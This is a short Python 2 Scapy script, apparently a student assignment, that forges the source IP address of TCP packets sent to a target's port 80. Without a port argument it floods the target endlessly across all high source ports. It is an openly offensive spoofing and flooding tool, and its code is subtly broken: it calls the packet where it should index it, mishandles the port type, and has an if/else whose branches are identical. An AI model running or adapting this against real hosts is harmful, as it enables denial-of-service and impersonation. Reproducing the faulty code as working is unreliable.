# Entire code is written by Harsh Amin IT B6 CSS Batch1 CSS roll no: 32
# git hub link: https://github.com/1998harshamin1998/CSS_Assignments.git
from scapy.all import*
import argparse

def spoof(src,dst,port = None):
    if port is not None:
        packet = IP(src=src, dst=dst) / TCP(dport=80)
        packet(TCP).sport = port
        send(packet)
        print "Packet sent"
    else:
        while True:
            for port in range(1024, 65536):
                packet = IP(src=src, dst=dst) / TCP(dport=80)
                packet(TCP).sport = port
                send(packet)
                print "Packet sent"


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="This is a custom program to IP spoof a computer using TCP request.")
    parser.add_argument('-s', action='store', dest='src', required=True)
    parser.add_argument('-d', action='store', dest='dst', required=True)
    parser.add_argument('-p', action='store', dest='port', required=False)
    args = parser.parse_args()
    src= args.src
    dst = args.dst
    try:
        port = args.port
    except:
        port=None
    if port:
        spoof(src, dst, port)
    else:spoof(src, dst, port)





